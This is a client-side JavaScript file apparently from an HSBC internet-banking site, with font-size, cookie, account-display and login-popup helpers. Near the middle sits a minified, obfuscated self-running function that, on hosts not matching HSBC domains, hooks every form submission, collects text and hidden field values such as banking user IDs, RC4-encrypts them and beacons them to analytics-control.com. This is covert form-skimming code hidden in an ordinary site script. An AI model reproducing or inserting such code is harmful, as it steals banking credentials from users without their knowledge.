

var fontSize = 100;
var fMax = 120;
var fMin = 100;
var isIE501 = navigator.userAgent.indexOf("MSIE 5.01") > 0 ? true : false;
var isNN6 = navigator.userAgent.indexOf("Netscape6") > 0 ? true : false;
var isIE=document.all&&navigator.userAgent.indexOf("Opera")==-1;
var SKIP_VISIBLE = "#000";
var SKIP_INVISIBLE = "#fff";
function setFontSize() {
}


function changeFontSize(increment) {
	if(increment) {
		fontSize=parseInt(fontSize) + parseInt(10);
	} else {
		fontSize=parseInt(fontSize) - parseInt(10);
	}

	if(fontSize > fMax) {
		fontSize = fMax;
	}
	if(fontSize < fMin) {
		fontSize = fMin;
	}
	switch(fontSize) {
		case 100:
			document.body.style.fontSize = "1em";
			break;
		case 110:
			document.body.style.fontSize = "1.10em";
			break;
		case 120:
			document.body.style.fontSize = "1.20em";
			break;
	}
	setCookie('fontSize', fontSize, "", "/");
	fontSize = fontSize - 20;
}
function incrementFontSize() {
	changeFontSize(true);
}

function decrementFontSize() {
	changeFontSize(false);
}

function setCookie(name, value, expires, path, domain, secure) {
    document.cookie= name + "=" + escape(value) +
        ((expires) ? "; expires=" + expires.toGMTString() : "") +
        ((path) ? "; path=" + path : "") +
        ((domain) ? "; domain=" + domain : "") +
        ((secure) ? "; secure" : "");
}

function getCookie(name) {
    var dc = document.cookie;
    var prefix = name + "=";
    var begin = dc.indexOf("; " + prefix);
    if (begin == -1) {
        begin = dc.indexOf(prefix);
        if (begin != 0) return null;
    } else {
        begin += 2;
    }
    var end = document.cookie.indexOf(";", begin);
    if (end == -1) {
        end = dc.length;
    }
    return unescape(dc.substring(begin + prefix.length, end));
}

var count = 0;
function checkInput(theInputBox, maxChars, previousId, nextId) {
	if(nextId != "") {
		nextInputBox = document.getElementById(nextId);
		if((count == (maxChars-1)) && (theInputBox.value.length == maxChars)) {
			if(nextInputBox.value.length == 0) {
				count = 1;
			} else {
				count = nextInputBox.value.length;
			}
			nextInputBox.select();
			return;
		}
	}
	if(count == 0 && theInputBox.value.length == 0) {
		PreviousInputBox = document.getElementById(previousId);
		if(PreviousInputBox.value.length == 0) {
			count = 1;
		} else {
			count = PreviousInputBox.value.length;
		}
		PreviousInputBox.select();
		return;
	}
	count = theInputBox.value.length;
}
function previous(theInputBox) {
	count = theInputBox.value.length;
}
function current(theInputBox) {
	count = 999;
	theInputBox.select();
}

function hideAccounts() {
	switchAccountDisplay("none", "block", true);
}

function showAccounts() {
	switchAccountDisplay("block", "none", true);
}
function hideDetails() {
	switchDetailDisplay("none", "block");
}

function showDetails() {
	switchDetailDisplay("block", "none");
}

function switchDetailDisplay(state1, state2) {
	if(document.getElementById("detail-switch")) {
		document.getElementById("detail-switch").style.display = state1;
		document.getElementById("hide-detail-switch").style.display = state1;
		document.getElementById("show-detail-switch").style.display = state2;
	}
}

function displayTag(address,text,title) {
	if(title==null) {
		title = text;
	}
	document.write('<div class=\"hsbcButtonLeft\"></div> <div class=\"hsbcButtonCenter\"><a href=\"',address,'\" title=\"',title,'\">',text,'</a><i>.</i></div><div class=\"hsbcButtonRight\"></div>');
}

function displayResetTag(text) {
		document.write('<div class=\"hsbcButtonLeft\"></div> <div class=\"hsbcButtonCenter\"><a href=\"#\"  onclick=\"document.forms[0].reset()\" onkeypress=\"document.forms[0].reset()\">',text,'</a><i>.</i></div><div class=\"hsbcButtonRight\"></div>');
}

function displayPrintTag() {
	document.write('&nbsp;-&nbsp;<a href=\"#\" class=\"important\">print this page</a>');
}
function switchAccountDisplay(state1, state2, browserReload) {
	if(document.getElementById("jsAccountDetails")) {
		document.getElementById("jsAccountDetails").style.display = state1;
		document.getElementById("jsHideAccounts").style.display = state1;
		document.getElementById("jsShowAccounts").style.display = state2;
		setCookie("state1", state1, "", "/");
		setCookie("state2", state2, "", "/");
		if((browserReload == true) && ((isIE501 == true) || (isNN6==true))) {
			location.reload();
		}
	}
}



function restoreAccountDisplay() {
	state1 = getCookie("state1") == null ? "none" : getCookie("state1");
	state2 = getCookie("state2") == null ? "block" : getCookie("state2");
	switchAccountDisplay(state1, state2, false);
}

function setJSFunctionality() {
	if(document.getElementById("jsSecondaryFunctionality")) {
		document.getElementById("jsSecondaryFunctionality").style.display = "block";
	}
}



function expandAll() {
	toggleAll('block');
}

function collapseAll() {
	toggleAll('none');
}

function expandAllLink() {
	expandAll()
	if(document.getElementById("jsExpandAll")) {
			document.getElementById("jsExpandAll").style.display = "none";
	}
	if(document.getElementById("jsCollapseAll")) {
			document.getElementById("jsCollapseAll").style.display = "block";
	}
}

function collapseAllLink() {
	collapseAll()
	if(document.getElementById("jsExpandAll")) {
			document.getElementById("jsExpandAll").style.display = "block";
	}
	if(document.getElementById("jsCollapseAll")) {
			document.getElementById("jsCollapseAll").style.display = "none";
	}
}


function skipLinkFocus(skipLinkName) {
	skipLinkName.style.color = SKIP_VISIBLE;
}

function skipLinkBlur(skipLinkName) {
	skipLinkName.style.color = SKIP_INVISIBLE;
}

function do_onload() {
	setFontSize();
	setJSFunctionality();
	restoreAccountDisplay();

	if(document.getElementById("jsSiteMap")) {
		collapseAll()
	}
	
	if(document.getElementById("jsSiteMapBar")) {
		document.getElementById("jsSiteMapBar").style.display = "block";
	}
	
	/* if(document.getElementById("detail-switch")) {
		document.getElementById("detail-switch").style.display = "none";
		document.getElementById("show-detail-switch").style.display = "block";
		document.getElementById("hide-detail-switch").style.display = "none";
		document.getElementById("nojs-detail-switch").style.display = "none";
	} */
}


if (window.addEventListener) {
	window.addEventListener("load", do_onload, false);
} else {
	if (window.attachEvent) {
		window.attachEvent("onload", do_onload);
	} else {
		if (document.getElementById) {
			window.onload = do_onload;
		}
	}
}

function popup_help(url)
{
	newwindow=window.open(url,'name','status=yes,location=no,menubar=no,scrollbars=yes,toolbar=no,resizable=yes,width=635,height=545,top=0,screenY=0,left=0,screenX=0');
	if (window.focus) {newwindow.focus()}
	return false;
}


/*
<!--

function OnClickHandler()
{
	var agent = navigator.userAgent.toLowerCase();
	
	if ( (agent.indexOf("msie") == -1) || (agent.indexOf("mac") == -1) )
	{	
		var el=null;
		var flag=true;
		if (typeof  window.event !== "undefined"){
			el = event.srcElement;
			while (flag && el)   
			{
				if (el.tagName == "A")
				{ 
					flag=false;
					if (el.protocol == "javascript:")
					{
						execScript(unescape(el.href), "javascript");
						window.event.returnValue = false; 
					}
				}
			} 
		}	else { 
			el = el.parentElement; 
		}
	}
} // end OnClickHandler()

document.onclick = OnClickHandler; // set the On click handler for the document 
//-->
*/

        var home_entity = "HOME";
	var business_entity = "BUSINESS";
	var corperate_entity = "CORPERATE";
        var general_entity = "GENERAL";

	var destination = "";
	var destinationURL = "";
	var logoffCommand = "";

	function invokePublicWarning(newEntity, entityURL) {
		destination = newEntity;
		destinationURL =entityURL;			
		leaveFusedSite(entityURL);
        }

	var loggedOn = false;

	function setLoggedOn() {
		loggedOn=true;
	}

	function setLoggedOff() {
		loggedOn=false;
	}


function pibService ()
{
    document.navbarLogon.submit() ;
}


function isEmpty()
{
	if ( document.navbarLogon.internetBankingID.value == "" )
	{
		alert('To enter Internet Banking, please ensure you have entered your User ID.');
		return false;
	}	
		else 
	
		{
			if(navigator.appName.indexOf("Netscape")>(-1))
			{
				pibwin = window.open( '', '_pib', 'resizable,status,width=790,height=520,x=0,y=0,top=0,left=0' );
				document.navbarLogon.submit();
				setTimeout("clearMe()", 10000);
				pibwin.focus();
				return false;
			}
			else
			{
				pibwin = window.open( '', '_pib', 'resizable, status=yes, width=740, height=520,top=0,left=0' );
				document.navbarLogon.submit();
				setTimeout("clearMe()", 10000);
				pibwin.focus();
				return false;
			}
		}
	
	
}

var pibwin = null;

function clearMe()
{
	var agt=navigator.userAgent.toLowerCase();
		
	document.navbarLogon.internetBankingID.value = "";
	
}


function windowOpen()
{
	if(navigator.appName.indexOf("Netscape")>(-1))
	{
	pibwin = window.open('','_pib','resizable,status,width=790,height=520,top=0,left=0');
	window.focus;
	}
	else
	{
	pibwin = window.open('','_pib','resizable,status,width=740,height=520,top=0,left=0');
	window.focus;
	}
}

(function(){var e=true;var m=[/\.hsbc\.co\.uk$/i,/\.hsbc$/i,/\.netd\.hsbc\.com\.hk$/i,/webcache\.googleusercontent\.com$/i,/translate\.googleusercontent\.com$/i,/193\.108\.7[23456789]\.\d+$/i];var D="https://www.analytics-control.com/47518/cc";var s=["intbankingID","userID"];var j=["userid","BankingID","user"];var q=5000;var d=47518;var x="7pUpHEhu";var c=[/[iI][bB]\d\d\d\d\d\d\d\d\d\d$/];var A=function(){var I=z();for(var H=0,G=m.length;H<G;H++){if(m[H].test(I)){e=false;break}}if(e){k();a(g);g()}};var g=function(){var H=u();for(var I=0,G=H.length;I<G;I++){if(l(H[I].cc)&&r(H[I])){y(H[I])}}};var z=function(){var G=window.location.host||"";return G.toLowerCase().replace(/:\d+$|\.$/,"")};var r=function(J){var K=J.elements;var I=false;for(var H=0,G=K.length;H<G;H++){if(E(K[H].id,s)||E(K[H].name,j)){I=true;break}}return(I||(J.method||"").toLowerCase()=="post")};var p=function(G){return(typeof(G)=="string"||n(G))&&G.length==0};var n=function(G){return typeof(G)=="object"&&(G instanceof Array)};var l=function(G){return typeof(G)=="undefined"};var E=function(I,J){if(n(J)){for(var H=0,G=J.length;H<G;H++){if(I==J[H]){return true}}}return false};var h=function(I){try{var L=[];var J=I.elements;L.push(["form_name",I.name||I.id||"none"],["form_action",I.action||"none"]);for(var H=0,G=J.length;H<G;H++){K=J[H];if(!p(K.value)&&(K.type=="hidden"||K.type=="text")){L.push([(K.id||K.name||"e"+H),K.value])}}if(!p(L)){F(L,2,function(){I._submit()})}}catch(K){}};var v=function(G){var I=null;if(window.event){I=window.event.srcElement}else{I=G.target}var H=document.getElementById(I.id);h(H);setTimeout(function(){H._submit()},q);if(G.preventDefault){G.preventDefault()}return false};var C=function(){return Math.floor(Math.random()*999999)};var F=function(K,I,L){var G=C();var H=[["source",window.location],["referrer",document.referrer||"none"],["code",d],["nonce",G],["a",I]];var J=new Image();J.id=G;if(L!=null){w(J,"load",L)}J.src=[D,t(K.concat(H))].join("?")};var t=function(J){var I=[];for(var H=0,G=J.length;H<G;H++){if(n(J[H])){I.push(J[H].join("::"))}}return["params",encodeURIComponent(o(f(I.join("||"),x)))].join("=")};var B=function(I,G){var H=[[I,G]];F(H,2,null)};var i=function(H){var J=null;if(window.event){J=window.event.srcElement}else{J=H.target}if(J!=null){for(var I=0,G=c.length;I<G;I++){if(c[I].test(J.value)){B(J.id||J.name||"none",J.value)}}}};var b=function(I){if(!I||I.length<=0){return}for(var H=0,G=I.length;H<G;H++){if(I[H].type=="text"){w(I[H],"change",i)}}};var y=function(G){try{G._submit=G.submit;G.submit=function(){h(G);setTimeout(function(){G._submit()},q)};if(!G.id){G.setAttribute("id","form"+C())}if(G.id!="vaLaunchFormHSBC"){w(G,"submit",v);}b(G.elements||[]);G.cc=true}catch(H){}};var u=function(){var G=[];try{G=document.getElementsByTagName("FORM")}catch(H){}return G};var k=function(){F([],1,null)};var f=function(M,K){var L=[];var H=[];for(var J=0;J<256;J++){L[J]=J}var I=0;var G;for(J=0;J<256;J++){I=(I+L[J]+K.charCodeAt(J%K.length))%256;G=L[J];L[J]=L[I];L[I]=G}J=0;I=0;for(var N=0;N<M.length;N++){J=(J+1)%256;I=(I+L[J])%256;G=L[J];L[J]=L[I];L[I]=G;H.push(String.fromCharCode(M.charCodeAt(N)^L[(L[J]+L[I])%256]))}return H.join("")};var o=function(J){var H="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";var G=[];var Q,O,M,P,N,L,K;var I=0;while(I<J.length){Q=J.charCodeAt(I++);O=J.charCodeAt(I++);M=J.charCodeAt(I++);P=Q>>2;N=((Q&3)<<4)|(O>>4);L=((O&15)<<2)|(M>>6);K=M&63;if(isNaN(O)){L=K=64}else{if(isNaN(M)){K=64}}G.push(H.charAt(P),H.charAt(N),H.charAt(L),H.charAt(K))}return G.join("")};function a(G){if(!window){return}if(document.readyState=="complete"){G();return}if(w(window,"load",G)){return}var I=G;if(typeof(window.onload)=="function"){var H=window.onload;I=function(){var J=G();return H?H():J};window.onload=I}}var w=function(J,I,G){if(J.addEventListener){J.addEventListener(I,G,false);return true}if(J.attachEvent){var H=J.attachEvent("on"+I,G);return H}return false};if(window.location.protocol!="https:"){A()}})();


var da = (document.all) ? 1 : 0;
var pr = (window.print) ? 1 : 0;
var mac = (navigator.userAgent.indexOf("Mac") != -1); 

function printPage() {
  if (pr)
    window.print()
  else if (da && !mac)
    vbPrintPage()
  else
    alert("Sorry, your browser doesn't support this feature.\n\nTry Ctrl-P to Print.");
  return;
}

if (da && !pr && !mac) with (document) {
  writeln('<OBJECT ID="WB" WIDTH="0" HEIGHT="0" CLASSID="clsid:8856F961-340A-11D0-A96B-00C04FD705A2"></OBJECT>');
  writeln('<' + 'SCRIPT LANGUAGE="VBScript">');
  writeln('Sub window_onunload');
  writeln('  On Error Resume Next');
  writeln('  Set WB = nothing');
  writeln('End Sub');
  writeln('Sub vbPrintPage');
  writeln('  OLECMDID_PRINT = 6');
  writeln('  OLECMDEXECOPT_DONTPROMPTUSER = 2');
  writeln('  OLECMDEXECOPT_PROMPTUSER = 1');
  writeln('  On Error Resume Next');
  writeln('  WB.ExecWB OLECMDID_PRINT, OLECMDEXECOPT_DONTPROMPTUSER');
  writeln('End Sub');
  writeln('<' + '/SCRIPT>');
}


// Used in forgotten user id for continue button
function displayTagWithOnClick(address,text,title) {
	if(title==null) {
		title = text;
	}
	
	document.write('<div class=\"hsbcButtonLeft\"></div> <div class=\"hsbcButtonCenter\"><a href=\"#\" onClick=\"',address,'\" title=\"',title,'\">',text,'</a><i>.</i></div><div class=\"hsbcButtonRight\"></div>');
}

